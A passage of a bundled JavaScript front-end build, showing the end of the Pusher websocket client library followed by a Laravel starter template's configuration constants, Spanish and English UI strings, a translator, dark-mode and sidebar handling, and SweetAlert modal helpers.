                  customHandler: ChannelAuthorizerProxy(pusher2, channelAuthorization, opts.authorizer)
                };
              }
            }
            return channelAuthorization;
          }
          function buildChannelAuthorizer(opts, pusher2) {
            const channelAuthorization = buildChannelAuth(opts, pusher2);
            if (hasCustomHandler(channelAuthorization)) {
              return channelAuthorization["customHandler"];
            }
            return channel_authorizer(channelAuthorization);
          }
          class watchlist_WatchlistFacade extends dispatcher_Dispatcher {
            constructor(pusher2) {
              super(function(eventName, data) {
                logger.debug(`No callbacks on watchlist events for ${eventName}`);
              });
              this.pusher = pusher2;
              this.bindWatchlistInternalEvent();
            }
            handleEvent(pusherEvent) {
              pusherEvent.data.events.forEach((watchlistEvent) => {
                this.emit(watchlistEvent.name, watchlistEvent);
              });
            }
            bindWatchlistInternalEvent() {
              this.pusher.connection.bind("message", (pusherEvent) => {
                var eventName = pusherEvent.event;
                if (eventName === "pusher_internal:watchlist_events") {
                  this.handleEvent(pusherEvent);
                }
              });
            }
          }
          function flatPromise() {
            let resolve, reject;
            const promise = new Promise((res, rej) => {
              resolve = res;
              reject = rej;
            });
            return { promise, resolve, reject };
          }
          var flat_promise = flatPromise;
          class user_UserFacade extends dispatcher_Dispatcher {
            constructor(pusher2) {
              super(function(eventName, data) {
                logger.debug("No callbacks on user for " + eventName);
              });
              this.signin_requested = false;
              this.user_data = null;
              this.serverToUserChannel = null;
              this.signinDonePromise = null;
              this._signinDoneResolve = null;
              this._onAuthorize = (err, authData) => {
                if (err) {
                  logger.warn(`Error during signin: ${err}`);
                  this._cleanup();
                  return;
                }
                this.pusher.send_event("pusher:signin", {
                  auth: authData.auth,
                  user_data: authData.user_data
                });
              };
              this.pusher = pusher2;
              this.pusher.connection.bind("state_change", ({ previous, current }) => {
                if (previous !== "connected" && current === "connected") {
                  this._signin();
                }
                if (previous === "connected" && current !== "connected") {
                  this._cleanup();
                  this._newSigninPromiseIfNeeded();
                }
              });
              this.watchlist = new watchlist_WatchlistFacade(pusher2);
              this.pusher.connection.bind("message", (event) => {
                var eventName = event.event;
                if (eventName === "pusher:signin_success") {
                  this._onSigninSuccess(event.data);
                }
                if (this.serverToUserChannel && this.serverToUserChannel.name === event.channel) {
                  this.serverToUserChannel.handleEvent(event);
                }
              });
            }
            signin() {
              if (this.signin_requested) {
                return;
              }
              this.signin_requested = true;
              this._signin();
            }
            _signin() {
              if (!this.signin_requested) {
                return;
              }
              this._newSigninPromiseIfNeeded();
              if (this.pusher.connection.state !== "connected") {
                return;
              }
              this.pusher.config.userAuthenticator({
                socketId: this.pusher.connection.socket_id
              }, this._onAuthorize);
            }
            _onSigninSuccess(data) {
              try {
                this.user_data = JSON.parse(data.user_data);
              } catch (e2) {
                logger.error(`Failed parsing user data after signin: ${data.user_data}`);
                this._cleanup();
                return;
              }
              if (typeof this.user_data.id !== "string" || this.user_data.id === "") {
                logger.error(`user_data doesn't contain an id. user_data: ${this.user_data}`);
                this._cleanup();
                return;
              }
              this._signinDoneResolve();
              this._subscribeChannels();
            }
            _subscribeChannels() {
              const ensure_subscribed = (channel) => {
                if (channel.subscriptionPending && channel.subscriptionCancelled) {
                  channel.reinstateSubscription();
                } else if (!channel.subscriptionPending && this.pusher.connection.state === "connected") {
                  channel.subscribe();
                }
              };
              this.serverToUserChannel = new channel_Channel(`#server-to-user-${this.user_data.id}`, this.pusher);
              this.serverToUserChannel.bind_global((eventName, data) => {
                if (eventName.indexOf("pusher_internal:") === 0 || eventName.indexOf("pusher:") === 0) {
                  return;
                }
                this.emit(eventName, data);
              });
              ensure_subscribed(this.serverToUserChannel);
            }
            _cleanup() {
              this.user_data = null;
              if (this.serverToUserChannel) {
                this.serverToUserChannel.unbind_all();
                this.serverToUserChannel.disconnect();
                this.serverToUserChannel = null;
              }
              if (this.signin_requested) {
                this._signinDoneResolve();
              }
            }
            _newSigninPromiseIfNeeded() {
              if (!this.signin_requested) {
                return;
              }
              if (this.signinDonePromise && !this.signinDonePromise.done) {
                return;
              }
              const { promise, resolve, reject: _ } = flat_promise();
              promise.done = false;
              const setDone = () => {
                promise.done = true;
              };
              promise.then(setDone).catch(setDone);
              this.signinDonePromise = promise;
              this._signinDoneResolve = resolve;
            }
          }
          class pusher_Pusher {
            static ready() {
              pusher_Pusher.isReady = true;
              for (var i2 = 0, l2 = pusher_Pusher.instances.length; i2 < l2; i2++) {
                pusher_Pusher.instances[i2].connect();
              }
            }
            static getClientFeatures() {
              return keys(filterObject({ ws: runtime.Transports.ws }, function(t) {
                return t.isSupported({});
              }));
            }
            constructor(app_key, options) {
              checkAppKey(app_key);
              validateOptions(options);
              this.key = app_key;
              this.options = options;
              this.config = getConfig(this.options, this);
              this.channels = factory.createChannels();
              this.global_emitter = new dispatcher_Dispatcher();
              this.sessionID = runtime.randomInt(1e9);
              this.timeline = new timeline_Timeline(this.key, this.sessionID, {
                cluster: this.config.cluster,
                features: pusher_Pusher.getClientFeatures(),
                params: this.config.timelineParams || {},
                limit: 50,
                level: timeline_level.INFO,
                version: defaults2.VERSION
              });
              if (this.config.enableStats) {
                this.timelineSender = factory.createTimelineSender(this.timeline, {
                  host: this.config.statsHost,
                  path: "/timeline/v2/" + runtime.TimelineTransport.name
                });
              }
              var getStrategy = (options2) => {
                return runtime.getDefaultStrategy(this.config, options2, strategy_builder_defineTransport);
              };
              this.connection = factory.createConnectionManager(this.key, {
                getStrategy,
                timeline: this.timeline,
                activityTimeout: this.config.activityTimeout,
                pongTimeout: this.config.pongTimeout,
                unavailableTimeout: this.config.unavailableTimeout,
                useTLS: Boolean(this.config.useTLS)
              });
              this.connection.bind("connected", () => {
                this.subscribeAll();
                if (this.timelineSender) {
                  this.timelineSender.send(this.connection.isUsingTLS());
                }
              });
              this.connection.bind("message", (event) => {
                var eventName = event.event;
                var internal = eventName.indexOf("pusher_internal:") === 0;
                if (event.channel) {
                  var channel = this.channel(event.channel);
                  if (channel) {
                    channel.handleEvent(event);
                  }
                }
                if (!internal) {
                  this.global_emitter.emit(event.event, event.data);
                }
              });
              this.connection.bind("connecting", () => {
                this.channels.disconnect();
              });
              this.connection.bind("disconnected", () => {
                this.channels.disconnect();
              });
              this.connection.bind("error", (err) => {
                logger.warn(err);
              });
              pusher_Pusher.instances.push(this);
              this.timeline.info({ instances: pusher_Pusher.instances.length });
              this.user = new user_UserFacade(this);
              if (pusher_Pusher.isReady) {
                this.connect();
              }
            }
            switchCluster(options) {
              const { appKey, cluster } = options;
              this.key = appKey;
              this.options = Object.assign(Object.assign({}, this.options), { cluster });
              this.config = getConfig(this.options, this);
              this.connection.switchCluster(this.key);
            }
            channel(name) {
              return this.channels.find(name);
            }
            allChannels() {
              return this.channels.all();
            }
            connect() {
              this.connection.connect();
              if (this.timelineSender) {
                if (!this.timelineSenderTimer) {
                  var usingTLS = this.connection.isUsingTLS();
                  var timelineSender = this.timelineSender;
                  this.timelineSenderTimer = new timers_PeriodicTimer(6e4, function() {
                    timelineSender.send(usingTLS);
                  });
                }
              }
            }
            disconnect() {
              this.connection.disconnect();
              if (this.timelineSenderTimer) {
                this.timelineSenderTimer.ensureAborted();
                this.timelineSenderTimer = null;
              }
            }
            bind(event_name, callback, context) {
              this.global_emitter.bind(event_name, callback, context);
              return this;
            }
            unbind(event_name, callback, context) {
              this.global_emitter.unbind(event_name, callback, context);
              return this;
            }
            bind_global(callback) {
              this.global_emitter.bind_global(callback);
              return this;
            }
            unbind_global(callback) {
              this.global_emitter.unbind_global(callback);
              return this;
            }
            unbind_all(callback) {
              this.global_emitter.unbind_all();
              return this;
            }
            subscribeAll() {
              var channelName;
              for (channelName in this.channels.channels) {
                if (this.channels.channels.hasOwnProperty(channelName)) {
                  this.subscribe(channelName);
                }
              }
            }
            subscribe(channel_name) {
              var channel = this.channels.add(channel_name, this);
              if (channel.subscriptionPending && channel.subscriptionCancelled) {
                channel.reinstateSubscription();
              } else if (!channel.subscriptionPending && this.connection.state === "connected") {
                channel.subscribe();
              }
              return channel;
            }
            unsubscribe(channel_name) {
              var channel = this.channels.find(channel_name);
              if (channel && channel.subscriptionPending) {
                channel.cancelSubscription();
              } else {
                channel = this.channels.remove(channel_name);
                if (channel && channel.subscribed) {
                  channel.unsubscribe();
                }
              }
            }
            send_event(event_name, data, channel) {
              return this.connection.send_event(event_name, data, channel);
            }
            shouldUseTLS() {
              return this.config.useTLS;
            }
            signin() {
              this.user.signin();
            }
          }
          pusher_Pusher.instances = [];
          pusher_Pusher.isReady = false;
          pusher_Pusher.logToConsole = false;
          pusher_Pusher.Runtime = runtime;
          pusher_Pusher.ScriptReceivers = runtime.ScriptReceivers;
          pusher_Pusher.DependenciesReceivers = runtime.DependenciesReceivers;
          pusher_Pusher.auth_callbacks = runtime.auth_callbacks;
          var core_pusher = __webpack_exports__["default"] = pusher_Pusher;
          function checkAppKey(key) {
            if (key === null || key === void 0) {
              throw "You must pass your app key when you instantiate Pusher.";
            }
          }
          runtime.setup(pusher_Pusher);
        }
        /******/
      ])
    );
  });
})(pusher);
var pusherExports = pusher.exports;
const Pusher$1 = /* @__PURE__ */ getDefaultExportFromCjs(pusherExports);
var __defProp = Object.defineProperty;
var __typeError = (msg) => {
  throw TypeError(msg);
};
var __defNormalProp = (obj, key, value) => key in obj ? __defProp(obj, key, { enumerable: true, configurable: true, writable: true, value }) : obj[key] = value;
var __publicField = (obj, key, value) => __defNormalProp(obj, typeof key !== "symbol" ? key + "" : key, value);
var __accessCheck = (obj, member, msg) => member.has(obj) || __typeError("Cannot " + msg);
var __privateGet = (obj, member, getter) => (__accessCheck(obj, member, "read from private field"), getter ? getter.call(obj) : member.get(obj));
var __privateAdd = (obj, member, value) => member.has(obj) ? __typeError("Cannot add the same private member more than once") : member instanceof WeakSet ? member.add(obj) : member.set(obj, value);
var __privateSet = (obj, member, value, setter) => (__accessCheck(obj, member, "write to private field"), member.set(obj, value), value);
var __privateMethod = (obj, member, method) => (__accessCheck(obj, member, "access private method"), method);
var _SModal_static, checkAndExecuteShow_fn, checkAndExecuteUpdate_fn, inputModalBasic_fn, _LDate_static, _title, _body, _openUrl, _Notify_instances, createNotification_fn, _ROUTES, _Url_static, updateUrl_fn, _Websocket_static, checkQueuesService_fn, checkStorageAndToggleError_fn, _connectionFailed, _isStarted;
const _Constants = class _Constants2 {
  constructor() {
    __publicField(this, "constants");
    var _a;
    this.constants = {
      token: ((_a = document.querySelector('meta[name="csrf-token"]')) == null ? void 0 : _a.getAttribute("content")) ?? null,
      lang: "es",
      langDouble: "es-Es",
      defaultZoneName: "Europe/Madrid",
      // Europe/Lisbon
      appIcon: new URL("/resources/images/logo-app.png", "http://localhost/laravel-starter-template/").href,
      routeName_websockets_checkService: "hexagonal.ajax.websockets.checkService",
      routeName_queues_checkService: "hexagonal.ajax.queues.checkService",
      // Vite
      VITE_REVERB_APP_KEY: null,
      VITE_REVERB_HOST: "localhost",
      VITE_REVERB_PORT: 8080,
      VITE_REVERB_SCHEME: "http",
      VITE_BROADCASTING_ENABLED: false,
      VITE_APP_ENV: "local",
      VITE_APP_NAME: "Laravel",
      VITE_APP_STORAGE_VERSION: "0.0"
    };
  }
  // Mtodo para obtener la instancia nica de la clase (Singleton)
  static getInstance() {
    if (!_Constants2.instance) {
      _Constants2.instance = new _Constants2();
    }
    return _Constants2.instance;
  }
  // Mtodo esttico para obtener el valor de una constante especfica
  get(key) {
    return this.constants[key];
  }
  extend(newConfig) {
    this.constants = { ...this.constants, ...newConfig };
  }
  // Funcin para obtener todas las constantes de configuracin
  getConstants() {
    return this.constants;
  }
};
__publicField(_Constants, "instance");
let Constants = _Constants;
const save$1 = "Guardar";
const cancel$1 = "Cancelar";
const move_to$1 = "Mover a";
const close$1 = "Cerrar";
const detail$1 = "Detalle";
const copy$1 = "Copiar";
const search_placeholder$1 = "buscar...";
const select_placeholder$1 = "seleccionar";
const select_value_placeholder$1 = "--Selecciona valor--";
const copied_text$1 = "Texto copiado";
const confirm_delete_record_NAME$1 = 'Seguro que quieres eliminar el registro ":name"?';
const confirm_delete_FIELD_NAME$1 = 'Seguro que quieres eliminar :field ":name"?';
const record_RECORD_doesnt_exist_in_the_TABLE_table$1 = 'El registro ":record" no existe en la tabla :table';
const min_MIN_characters_on_search$1 = "La bsqueda debe tener al menos :min caracteres";
const add_FIELD$1 = "Aadir :field";
const see_FIELD$1 = "Ver :field";
const edit_FIELD_NAME$1 = 'Editar :field ":name"';
const the_page$1 = "la pgina";
const cannot_save_an_error$1 = "No puedes guardar un error";
const incorrect_blade_format$1 = "Formato blade incorrecto";
const to_empty$1 = "Vaciar";
const launch$1 = "Lanzar";
const correct$1 = "Correcto";
const ok$1 = "De acuerdo";
const reload_page$1 = "Recargar pgina";
const contact_pi_team$1 = "Contacta con el equipo de Herramientas PI";
const unforeseen_error$1 = "Error imprevisto";
const loading$1 = "Cargando";
const loading_dots$1 = "Cargando...";
const search$1 = "Buscar";
const searching_dots$1 = "Buscando...";
const no_results$1 = "Sin resultados";
const filter$1 = "Filtrar";
const date$1 = "Fecha";
const download_completed$1 = "Descarga completada";
const fetch_error_message$1 = "Hubo un problema con la peticin Fetch^:";
const some_class_does_not_meet_the_INTERFACE_interface_contract$1 = "Alguna Clase no cumple con el contrato de la interfaz :interface";
const it_has_been_called_a_JS_component_that_does_not_match_the_current_page$1 = "Se ha llamado un componente JS que no coincide con la pagina actual";
const need_NUMBER_characters$1 = "Necesarios :number caracteres";
const a_loader_was_expected_on_the_page$1 = "Se esperaba un loader en la pgina";
const check_if_the_loader_was_in_a_div$1 = "Comprueba si el loader estaba en un div. En ese caso se requiere el id del div.";
const you_do_not_have_permissions_to_edit$1 = "No tienes permisos para editar";
const es = {
  save: save$1,
  cancel: cancel$1,
  "delete": "Eliminar",
  move_to: move_to$1,
  close: close$1,
  detail: detail$1,
  copy: copy$1,
  search_placeholder: search_placeholder$1,
  select_placeholder: select_placeholder$1,
  select_value_placeholder: select_value_placeholder$1,
  copied_text: copied_text$1,
  confirm_delete_record_NAME: confirm_delete_record_NAME$1,
  confirm_delete_FIELD_NAME: confirm_delete_FIELD_NAME$1,
  record_RECORD_doesnt_exist_in_the_TABLE_table: record_RECORD_doesnt_exist_in_the_TABLE_table$1,
  min_MIN_characters_on_search: min_MIN_characters_on_search$1,
  add_FIELD: add_FIELD$1,
  see_FIELD: see_FIELD$1,
  edit_FIELD_NAME: edit_FIELD_NAME$1,
  the_page: the_page$1,
  cannot_save_an_error: cannot_save_an_error$1,
  incorrect_blade_format: incorrect_blade_format$1,
  to_empty: to_empty$1,
  launch: launch$1,
  correct: correct$1,
  ok: ok$1,
  reload_page: reload_page$1,
  contact_pi_team: contact_pi_team$1,
  unforeseen_error: unforeseen_error$1,
  loading: loading$1,
  loading_dots: loading_dots$1,
  search: search$1,
  searching_dots: searching_dots$1,
  no_results: no_results$1,
  filter: filter$1,
  date: date$1,
  download_completed: download_completed$1,
  fetch_error_message: fetch_error_message$1,
  some_class_does_not_meet_the_INTERFACE_interface_contract: some_class_does_not_meet_the_INTERFACE_interface_contract$1,
  it_has_been_called_a_JS_component_that_does_not_match_the_current_page: it_has_been_called_a_JS_component_that_does_not_match_the_current_page$1,
  need_NUMBER_characters: need_NUMBER_characters$1,
  a_loader_was_expected_on_the_page: a_loader_was_expected_on_the_page$1,
  check_if_the_loader_was_in_a_div: check_if_the_loader_was_in_a_div$1,
  you_do_not_have_permissions_to_edit: you_do_not_have_permissions_to_edit$1
};
const save = "Save";
const cancel = "Cancel";
const move_to = "Move to";
const close = "Close";
const detail = "Detail";
const copy = "Copy";
const search_placeholder = "search...";
const select_placeholder = "select";
const select_value_placeholder = "--Select value--";
const copied_text = "Copied text";
const confirm_delete_record_NAME = 'Are you sure you want to delete the ":name" record?';
const confirm_delete_FIELD_NAME = 'Are you sure you want to delete the ":name" :field?';
const record_RECORD_doesnt_exist_in_the_TABLE_table = 'The record ":record" does not exist in the :table table';
const min_MIN_characters_on_search = "Search must be at least :min characters";
const add_FIELD = "Add :field";
const see_FIELD = "See :field";
const edit_FIELD_NAME = 'Edit :field ":name"';
const the_page = "the page";
const cannot_save_an_error = "You can't save a mistake";
const incorrect_blade_format = "Incorrect blade format";
const to_empty = "To empty";
const launch = "Launch";
const correct = "It's right";
const ok = "Ok";
const reload_page = "Reload Page";
const contact_pi_team = "Contact the PI Tools team";
const unforeseen_error = "Unforeseen error";
const loading = "Loading";
const loading_dots = "Loading...";
const search = "Search";
const searching_dots = "Searching...";
const no_results = "No results";
const filter = "Filter";
const date = "Date";
const download_completed = "Download completed";
const fetch_error_message = "There was a problem with the FETCH request^:";
const some_class_does_not_meet_the_INTERFACE_interface_contract = "Some class does not meet the :interface interface contract";
const it_has_been_called_a_JS_component_that_does_not_match_the_current_page = "It has been called a JS component that does not match the current page";
const need_NUMBER_characters = "Need :number characters";
const a_loader_was_expected_on_the_page = "A loader was expected on the page";
const check_if_the_loader_was_in_a_div = "Check if the loader was in a div. In that case the div ID is required.";
const you_do_not_have_permissions_to_edit = "You do not have permissions to edit";
const en = {
  save,
  cancel,
  "delete": "Delete",
  move_to,
  close,
  detail,
  copy,
  search_placeholder,
  select_placeholder,
  select_value_placeholder,
  copied_text,
  confirm_delete_record_NAME,
  confirm_delete_FIELD_NAME,
  record_RECORD_doesnt_exist_in_the_TABLE_table,
  min_MIN_characters_on_search,
  add_FIELD,
  see_FIELD,
  edit_FIELD_NAME,
  the_page,
  cannot_save_an_error,
  incorrect_blade_format,
  to_empty,
  launch,
  correct,
  ok,
  reload_page,
  contact_pi_team,
  unforeseen_error,
  loading,
  loading_dots,
  search,
  searching_dots,
  no_results,
  filter,
  date,
  download_completed,
  fetch_error_message,
  some_class_does_not_meet_the_INTERFACE_interface_contract,
  it_has_been_called_a_JS_component_that_does_not_match_the_current_page,
  need_NUMBER_characters,
  a_loader_was_expected_on_the_page,
  check_if_the_loader_was_in_a_div,
  you_do_not_have_permissions_to_edit
};
const _Translator = class _Translator2 {
  constructor() {
    __publicField(this, "locale", __const("lang"));
    __publicField(this, "translations", { en, es });
    __publicField(this, "externalTranslations", {});
  }
  static getInstance() {
    if (!_Translator2.instance) {
      _Translator2.instance = new _Translator2();
    }
    return _Translator2.instance;
  }
  registerTranslations(locale, translations) {
    if (!this.externalTranslations[locale]) {
      this.externalTranslations[locale] = {};
    }
    this.externalTranslations[locale] = {
      ...this.externalTranslations[locale],
      ...translations
    };
  }
  get(key, replacements) {
    var _a, _b;
    const internalTranslation = (_a = this.translations[this.locale]) == null ? void 0 : _a[key];
    const externalTranslation = (_b = this.externalTranslations[this.locale]) == null ? void 0 : _b[key];
    let translation = externalTranslation || internalTranslation || key;
    if (replacements) {
      for (const [placeholder, value] of Object.entries(replacements)) {
        if (value) {
          const regex = new RegExp(`(^|[^\\^]):${placeholder}`, "g");
          translation = translation.replace(regex, `$1${value}`);
        }
      }
    }
    translation = translation.replace(/\^:/g, ":");
    return translation;
  }
};
__publicField(_Translator, "instance");
let Translator = _Translator;
const __const = (key) => {
  return Constants.getInstance().get(key);
};
const ___ = (key, replacements) => {
  return Translator.getInstance().get(key, replacements);
};
class CannotOpenModalException extends Error {
  constructor(msg) {
    super(msg);
    this.name = "CannotOpenModalException";
  }
}
class CannotOpenModalWarning extends Error {
  constructor(msg) {
    super(msg);
    this.name = "CannotOpenModalWarning";
  }
}
class Instantiable {
  // Mtodo esttico para instanciar clases hijas
  static new(...args) {
    return new this(...args);
  }
}
class DomService extends Instantiable {
  constructor() {
    super(...arguments);
    __publicField(this, "$document", document.documentElement);
  }
  // Funcin generalizada para cambiar clases y almacenar en localStorage
  setState(key, className, isActive) {
    this.$document.classList.toggle(className, isActive);
    localStorage.setItem(key, isActive ? "true" : "false");
  }
  // Comprobar y aplicar estado inicial desde localStorage
  initializeState(key, className, prefersCondition, callback = null) {
    const savedState = localStorage.getItem(key);
    let isActive;
    if (savedState !== null) {
      isActive = savedState === "true";
      this.setState(key, className, isActive);
    } else {
      isActive = this.$document.classList.contains(className) || prefersCondition;
    }
    this.setState(key, className, isActive);
    if (callback) callback(isActive);
    return isActive;
  }
  startDarkMode() {
    const themeToggleDarkIcon = document.getElementById("theme-toggle-dark-icon");
    const themeToggleLightIcon = document.getElementById("theme-toggle-light-icon");
    const themeToggleBtn = document.getElementById("theme-toggle");
    const setTheme = (isDark) => {
      this.setState("dark-theme", "dark", isDark);
      themeToggleDarkIcon == null ? void 0 : themeToggleDarkIcon.classList.toggle("hidden", isDark);
      themeToggleLightIcon == null ? void 0 : themeToggleLightIcon.classList.toggle("hidden", !isDark);
    };
    const systemPrefersDark = window.matchMedia("(prefers-color-scheme: dark)").matches;
    this.initializeState("dark-theme", "dark", systemPrefersDark, setTheme);
    themeToggleBtn == null ? void 0 : themeToggleBtn.addEventListener("click", () => {
      const isDark = !this.$document.classList.contains("dark");
      setTheme(isDark);
    });
  }
  startSidebarState() {
    const getSidebarKey = (routeName) => `sidebar-collapsed-${routeName}`;
    const sidebarToggleBtn = document.getElementById("sidebar-toggle");
    const currentRoute = s().current();
    const setSidebar = (isCollapsed) => {
      const sidebarKey2 = getSidebarKey(currentRoute);
      this.setState(sidebarKey2, "sc", isCollapsed);
    };
    const sidebarKey = getSidebarKey(currentRoute);
    this.initializeState(sidebarKey, "sc", false);
    sidebarToggleBtn == null ? void 0 : sidebarToggleBtn.addEventListener("click", () => {
      const isCollapsed = !this.$document.classList.contains("sc");
      setSidebar(isCollapsed);
    });
  }
}
const InputsNeedsChangeListener = ["range", "select", "radio", "checkbox", "date", "datetime-local", "time", "week", "month"];
const _SModal = class _SModal2 {
  static mustAbortIfIsAlreadyOpen({ isUpdate = false, ignorePendingLoading = false }) {
    if (g.errorModalIsShowed) throw new CannotOpenModalException("Se ha intentado abrir un modal cuando hay un modal de error abierto");
    if (!ignorePendingLoading && !isUpdate && _SModal2.isPendigLoading) throw new CannotOpenModalWarning("Se ha intentado abrir un modal cuando hay un modal de loading pendiente de actualizarse");
  }
  static toastInfo({
    icon = "info",
    title = "Your work has been saved",
    position = "top-end",
    timer = 3e3
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return _SModal2.Toast.fire({ icon, title, position, timer });
    });
  }
  static toastSuccess({
    icon = "success",
    title = "Your work has been saved",
    position = "top-end",
    timer = 3e3
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return _SModal2.Toast.fire({ icon, title, position, timer });
    });
  }
  static toastError({
    icon = "error",
    title = "Something error ocurred",
    position = "top-end",
    timer = 3e3
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return _SModal2.Toast.fire({ icon, title, position, timer });
    });
  }
  static toastBottom({
    icon = "success",
    title = "Your work has been saved",
    position = "bottom-end",
    timer = 3e3
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return _SModal2.Toast.fire({ icon, title, position, timer });
    });
  }
  static toastBoth({
    success,
    icon = void 0,
    iconOk = "success",
    iconNok = "error",
    title = void 0,
    titleOk = "Your work has been saved",
    titleNok = "Something error ocurred",
    timer = void 0,
    timerOk = 3e3,
    timerNok = 4e3,
    position = "top-end"
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      icon = icon !== void 0 ? icon : success ? iconOk : iconNok;
      title = title !== void 0 ? title : success ? titleOk : titleNok;
      timer = timer !== void 0 ? timer : success ? timerOk : timerNok;
      return _SModal2.Toast.fire({ icon, title, position, timer });
    });
  }
  static basic(params) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return Swal.fire(params);
    });
  }
  static successModal({
    icon = "success",
    title = "Correcto",
    html: html2 = "Todo ha ido bien",
    width = 850,
    confirmButtonText = "Ok",
    allowOutsideClick = () => !Swal.isLoading()
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return Swal.fire({
        icon,
        title,
        html: html2,
        width,
        confirmButtonText,
        allowOutsideClick
      });
    });
  }
  static errorModal({
    icon = "error",
    title = "Ups...): Algo ha ido mal",
    html: html2 = void 0,
    width = 850,
    confirmButtonText = "Ok",
    allowOutsideClick = false,
    footer = void 0
  }, ignorePendingLoading = false) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({ ignorePendingLoading });
      return Swal.fire({
        icon,
        title,
        html: html2,
        width,
        showCloseButton: true,
        confirmButtonText,
        allowOutsideClick,
        footer
      });
    });
  }
  static confirmModal({
    title = "Confirmar",
    html: html2 = "Seguro que quieres realizar la accin?",
    width = 850,
    confirmButtonText = "Ok",
    cancelButtonText = "Cancelar"
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return Swal.fire({
        title,
        html: html2,
        width,
        showCancelButton: true,
        confirmButtonText,
        cancelButtonText,
        confirmButtonColor: _SModal2.colorRed,
        cancelButtonColor: _SModal2.colorGray,
        showLoaderOnConfirm: false,
        allowOutsideClick: false
        // "() => !Swal.isLoading()" -> para que no se pueda cerras si esta cargando. | "false" -> para que no se pueda cerrar
      });
    });
  }
  static loadingModal({
    title = "Calculando...",
    width = 850,
    willOpen = () => Swal.showLoading()
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      _SModal2.isPendigLoading = true;
      return Swal.fire({
        title,
        width,
        showConfirmButton: false,
        willOpen: async (popup) => {
          await willOpen(popup);
          _SModal2.isPendigLoading = false;
        },
        allowOutsideClick: () => !Swal.isLoading()
      });
    });
  }
  static loadingModalAndDoAction({
    title = "Calculando...",
    ajaxUrl,
    ajaxType,
    ajaxParams,
    allowOutsideClick = () => !Swal.isLoading(),
    footerOnFail = void 0
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      _SModal2.isPendigLoading = true;
      return Swal.fire({
        title,
        width: 850,
        showConfirmButton: false,
        willOpen: async (popup) => {
          Swal.showLoading();
          try {
            const result = await g.newFetch({ url: ajaxUrl, type: ajaxType, ajaxParams });
            if (!result.success) {
              const html2 = (result == null ? void 0 : result.detail) ? `<div>${result.message}</div><br><small>${result.detail}</small>` : result.message;
              _SModal2.updateErrorModal({ icon: "warning", html: html2 });
              return;
            }
            _SModal2.updateSuccessModal({ title: "Correcto", html: result.message });
          } catch (e2) {
            g.catchCode({ error: e2, footer: footerOnFail });
          }
          _SModal2.isPendigLoading = false;
        },
        allowOutsideClick
      });
    });
  }
  static updateModal(params) {
    var _a;
    __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteUpdate_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({ isUpdate: true });
      if (params.hideLoading === true) {
        Swal.hideLoading();
        delete params.hideLoading;
      }
      Swal.update(params);
    });
  }
  static updateSuccessModal({
    icon = "success",
    title = "Exito",
    html: html2 = "Todo ha ido bien",
    hideLoading: hideLoading2 = true,
    footer = void 0,
    allowOutsideClick = void 0
  }) {
    _SModal2.updateModal({
      icon,
      title,
      html: html2,
      hideLoading: hideLoading2,
      footer,
      allowOutsideClick,
      showConfirmButton: true
    });
  }
  static updateErrorModal({
    icon = "error",
    title = "Error",
    html: html2 = "Ha habido algun error",
    hideLoading: hideLoading2 = true,
    footer = void 0,
    allowOutsideClick = void 0
  }) {
    _SModal2.updateModal({
      icon,
      title,
      html: html2,
      hideLoading: hideLoading2,
      footer,
      allowOutsideClick,
      showConfirmButton: true
    });
  }
  static confirmModalAfterAjaxCheck({
    title = "Confirmar",
    html: html2 = "Seguro que quieres realizar la accin?",
    confirmButtonText = "Ok",
    confirmButtonColor = _SModal2.colorBlue,
    cancelButtonText = "Cancelar",
    ajaxUrl,
    ajaxType = "GET",
    ajaxParams,
    footerOnFail = void 0
  }) {
    var _a;
    return __privateMethod(_a = _SModal2, _SModal_static, checkAndExecuteShow_fn).call(_a, () => {
      _SModal2.mustAbortIfIsAlreadyOpen({});
      return Swal.fire({
        title,
        width: 850,
        showCancelButton: true,
        confirmButtonText,
        cancelButtonText,
        confirmButtonColor,
        cancelButtonColor: _SModal2.colorGray,
        showLoaderOnConfirm: false,
        willOpen: async () => {
          Swal.showLoading();
          try {
            const res = await g.newFetch({ url: ajaxUrl, type: ajaxType, ajaxParams });
            if (res.success) {
              _SModal2.updateModal({ html: html2, confirmButtonColor: _SModal2.colorRed });
            } else {
              _SModal2.updateModal({
                html: `<span class="restriction-message">${res.message}</span>`,
                showConfirmButton: false,
                showCancelButton: true,
                cancelButtonText: "Ok",
                cancelButtonColor: _SModal2.colorBlue
              });
            }
          } catch (e2) {
            g.catchCode({
              error: e2,
              footer: footerOnFail,
              from: `confirmModalWithAjaxCheck->willOpen->fetch ${ajaxUrl}`
            });
          }
        },
        allowOutsideClick: () => !Swal.isLoading()
